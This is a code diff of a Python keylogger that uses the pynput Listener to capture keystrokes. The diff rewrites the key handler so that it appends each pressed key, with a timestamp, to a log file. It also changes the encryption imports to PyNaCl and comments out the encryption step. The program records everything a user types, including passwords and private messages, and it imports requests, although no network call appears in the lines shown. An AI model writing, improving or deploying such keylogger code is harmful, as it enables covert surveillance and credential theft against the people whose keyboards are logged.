@@ -4,10 +4,11 @@
 
 from pynput.keyboard import Listener
 import os
-import logging
 import platform
 import requests
-from cryptography.fernet import Fernet
+import time
+import nacl.secret
+import nacl.box
 
 
 def get_filepath():
@@ -33,16 +34,14 @@ def encrypt_file(file, key):
     print(key)
 
 
-def key_handler(key):
-    logging.info(key)
+def key_handler(key_press):
+    fp = open(r"{}".format(get_filepath()), 'a')
+    fp.write('{} pressed at time:{}\n\n'.format(key_press, time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())))
 
 
 def run():
-    key = get_key()
+    #key = get_key()
     log_dir = get_filepath()
-    encrypt_file(log_dir, key)
-    #logging.basicConfig(filename="{}".format(get_filepath()), level=logging.DEBUG, format="%(asctime)s: %(message)s")
-    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s: %(message)s")
     with Listener(on_press=key_handler) as listener:
         listener.join()
 
